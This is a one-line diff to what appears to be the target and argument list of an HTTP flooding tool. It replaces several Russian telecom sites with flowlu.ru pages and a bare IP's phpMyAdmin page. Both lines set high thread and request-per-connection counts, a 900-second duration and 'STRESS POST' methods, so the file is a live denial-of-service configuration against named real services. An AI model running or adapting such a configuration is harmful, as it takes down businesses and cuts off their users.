@@ -1,1 +1,1 @@
-https://neophones.ru https://neophones.ru/utm5/connect_master https://neocomms.ru/payment https://neocomms.ru/contacts https://neophones.ru/tariffs -t 1500 --rpc 1500 -p 900 --http-methods STRESS POST --table
+https://flowlu.ru https://my.flowlu.ru/register https://flowlu.ru/services/tasks/ https://flowlu.ru/prices/ https://flowlu.ru/blog/ http://178.170.244.102/phpmyadmin/ -t 2000 --rpc 1500 -p 900 --http-methods STRESS POST --table
